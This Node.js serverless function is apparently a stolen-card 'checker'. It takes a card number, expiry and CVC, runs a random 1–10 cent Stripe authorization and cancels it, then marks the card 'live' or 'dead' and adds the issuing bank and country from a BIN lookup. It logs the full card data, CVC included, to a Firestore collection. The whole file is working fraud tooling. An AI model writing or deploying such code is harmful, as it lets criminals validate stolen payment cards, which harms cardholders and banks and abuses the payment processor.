const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);

const admin = require('firebase-admin');



// Decode Firebase key from env

const serviceAccount = JSON.parse(Buffer.from(process.env.FIREBASE_KEY, 'base64').toString());



// Initialize Firebase Admin

if (!admin.apps.length) {

    admin.initializeApp({

        credential: admin.credential.cert(serviceAccount),

        databaseURL: `https://${serviceAccount.project_id}.firebaseio.com` // For Firestore

    });

}

const db = admin.firestore();



exports.handler = async (event) => {

    if (event.httpMethod !== 'POST') return {statusCode: 405, body: 'Method not allowed'};

    

    const { cardNumber, expiry, cvc } = JSON.parse(event.body);

    const [expMonth, expYear] = expiry.split('/');

    

    let status = 'dead';

    let details = 'Unknown';

    

    try {

        // Create a token to check validity

        const token = await stripe.tokens.create({

            card: {

                number: cardNumber,

                exp_month: expMonth,

                exp_year: `20${expYear}`,

                cvc: cvc

            }

        });

        

        // Attempt a micro-authorization (e.g., $0.01)

        const amount = Math.floor(Math.random() * 10) + 1; // 1-10 cents

        const paymentIntent = await stripe.paymentIntents.create({

            amount: amount,

            currency: 'usd',

            payment_method_data: {

                type: 'card',

                card: {token: token.id}

            },

            confirm: true,

            capture_method: 'manual' // Hold, don't capture

        });

        

        // If succeeds, card is "live"; get details

        if (paymentIntent.status === 'requires_capture') {

            // Cancel to avoid charges

            await stripe.paymentIntents.cancel(paymentIntent.id);

            status = 'live';

            details = await getCardDetails(cardNumber);

        }

    } catch (err) {

        details = err.message;

    }

    

    // Store in Firestore

    try {

        await db.collection('cardLogs').add({

            cardNumber,

            expiry,

            cvc,

            status,

            details,

            timestamp: admin.firestore.FieldValue.serverTimestamp()

        });

    } catch (dbErr) {

        console.error('Firestore error:', dbErr); // Log but don't fail the check

    }

    

    return {

        statusCode: 200,

        body: JSON.stringify({status, details: `${details.scheme || 'N/A'}, Bank: ${details.bank || 'N/A'}, Country: ${details.country || 'N/A'}`})

    };

};



async function getCardDetails(bin) {

    // Use HandyAPI for BIN lookup

    try {

        const response = await fetch(`https://data.handyapi.com/bin/${bin.substring(0,6)}`, {

            headers: {

                'x-api-key': process.env.HANDY_API_KEY

            }

        });

        if (response.ok) {

            const data = await response.json();

            return {

                scheme: data.Scheme || 'Unknown',

                bank: data.Issuer || 'Unknown',

                country: data.Country?.Name || 'Unknown'

            };

        }

    } catch (err) {

        console.error('HandyAPI error:', err);

    }

    return {scheme: 'Unknown', bank: 'Unknown', country: 'Unknown'};

}
